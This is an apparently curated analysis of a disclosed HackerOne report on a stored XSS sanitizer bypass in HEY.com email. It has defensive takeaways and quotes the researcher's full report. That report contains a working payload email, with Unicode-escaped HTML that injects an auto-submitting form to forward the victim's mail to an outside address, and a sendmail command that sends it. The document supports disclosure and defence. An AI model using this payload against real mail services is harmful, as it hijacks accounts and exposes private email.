# HEY.com Email Stored XSS via HTML Sanitizer Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 982291 | https://hackerone.com/reports/982291
- **Submitted:** 2020-09-15
- **Reporter:** jouko
- **Program:** HEY.com
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), HTML Sanitizer Bypass, CSRF Token Exfiltration
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can bypass HEY.com's HTML sanitizer by sending specially crafted raw HTML emails containing Unicode escape sequences that confuse the filter. The injected malicious HTML can leverage the Stimulus JavaScript framework to perform unwanted actions like email forwarding or CSRF token theft when victims view the email.

## Attack scenario
1. Attacker crafts a raw HTML email with style tags containing Unicode-encoded HTML entities (\000027 for quote, etc.)
2. Attacker uses sendmail or similar tool to send the email directly to the victim's HEY.com account
3. HEY.com's HTML sanitizer fails to properly decode and validate the Unicode escape sequences
4. The malicious payload breaks out of the style context and injects a form element targeting account settings endpoints
5. When victim views the email, the injected form with data-controller="beacon" attribute triggers Stimulus framework handlers
6. The framework automatically submits the form with valid CSRF token, modifying account settings (e.g., email forwarding to attacker-controlled address)

## Root cause
The HTML sanitizer performs insufficient validation of Unicode escape sequences in style attributes. It fails to decode character references before filtering, allowing attackers to obfuscate dangerous HTML tags. Additionally, the sanitizer doesn't prevent injection of form elements with framework-specific attributes that trigger automatic actions.

## Attacker mindset
Sophisticated attacker with knowledge of HTML sanitization techniques and the Stimulus framework. The attacker abuses Unicode encoding to evade filters and leverages existing framework functionality (Stimulus controllers) to perform unauthorized actions without traditional JavaScript execution, demonstrating framework-aware exploitation.

## Defensive takeaways
- Implement multi-pass sanitization: decode character references/escape sequences BEFORE filtering malicious tags
- Use allowlist-based HTML sanitization rather than blocklist approaches; only permit known-safe tags and attributes
- Sanitize not just tag names but also attribute values, especially data-* attributes that may trigger framework behaviors
- Apply Content Security Policy restrictions to inline styles; prevent style-based data exfiltration via url() functions
- Disable or require explicit opt-in for framework-level controllers that auto-execute actions on email content
- Validate and escape all user-controlled content at render time, not just at storage time
- Implement server-side CSRF token validation with origin checks; require explicit user interaction for sensitive operations

## Variant hunting
Look for similar Unicode bypass techniques in other sanitizers; test HTML entities (&#x; format), octal sequences, and mixed encoding. Search for other framework-specific attributes (data-action, data-target) that could auto-execute. Test SVG-based injection vectors and alternative quote-escaping methods. Examine whether other email fields (subject, sender name) are sanitized equivalently.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1548: Abuse Elevation Control Mechanism
- T1598: Phishing for Information (CSRF token theft variant)
- T1539: Steal Web Session Cookie

## Notes
Report demonstrates deep understanding of both sanitization evasion and framework exploitation. The Unicode escape sequence bypass (\000027 = single quote) is particularly clever. The attacker had to brute-force or enumerate account IDs (266986), suggesting a secondary enumeration vulnerability. The Stimulus framework auto-submission feature is a critical secondary issue. Report includes proof-of-concept with actual sendmail command and visible email ID for verification.

## Full report
<details><summary>Expand</summary>

An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.

To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.

Example email:
~~~~ plain
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
~~~~
To send the email, create a text file with the above contents. Send it with the command
~~~~ plain
/usr/sbin/sendmail -t < email.txt
~~~~


The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.

Finally, HTML like this is injected:
~~~~ html
<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
</form>
~~~~
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.

This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).

Another example is to simply set the form ```action``` to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.

The POST request in Chrome's developer console:
{F988220}

If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.

## Impact

A HEY user viewing an email sent by the attacker may have their account compromised.

</details>

---
*Analysed by Claude on 2026-05-12*
